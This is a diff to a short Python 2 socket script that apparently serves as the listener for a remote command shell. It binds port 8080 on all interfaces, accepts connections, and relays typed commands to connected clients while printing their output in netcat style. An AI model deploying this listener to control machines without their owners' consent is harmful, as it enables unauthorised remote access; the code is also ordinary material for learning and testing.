@@ -19,39 +19,53 @@
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 import socket
+import time
 
-host = ''
+host = '0.0.0.0'
 port = 8080
 
 def NewSocket():
     try:
         s = socket.socket()
     except socket.error as msg:
-        print "Socket error: " + str(msg)
+        print "[*] Socket error: " + str(msg)
     try:
-        print("Port: " + str(port))
         s.bind((host, port))
         s.listen(5)
         return s
     except socket.error as msg:
-        print "Socket binding error: " + str(msg)
+        print "[*] Socket binding error: " + str(msg)
 
 def AcceptConnection(s):
-    conn, address = s.accept()
-    print "New connection: " + address[0] + ":" + str(address[1])
-    SndCmds(conn)
-    conn.close()
-    s.close()
+    while True:
+        if s:
+            print "[*] Listening on [" + host + "] (port " + str(port) + ")."
+            conn, addr = s.accept()
+            print "[*] Connection from [" + addr[0] + "] port " + str(port) + " [tcp/*] accepted (sport " + str(addr[1]) + ")."
+            SndCmds(conn)
+        else: break
 
 def SndCmds(conn):
-    while True:
-        cmd = raw_input('>')
-        if cmd == 'quit':
-            return
-        if len(cmd) > 0:
-            conn.send(cmd)
-            client_response = conn.recv(1024)
-            print client_response
+    try:
+        while True:
+            # wait for data
+            recv_len = 1
+            response = ''
+            while recv_len and not response[-1:] == '>':
+                data = conn.recv(4096)
+                recv_len = len(data)
+                response += data
+                if recv_len == 0:
+                    break
+            print response
+            # wait for more input
+            buffer = raw_input('>')
+            buffer += '\n'
+            conn.send(buffer)
+            time.sleep(.1)
+    except:
+        print '[*] Exception. Exiting.'
+        conn.close()
 
 if __name__ == "__main__":
     AcceptConnection(NewSocket())
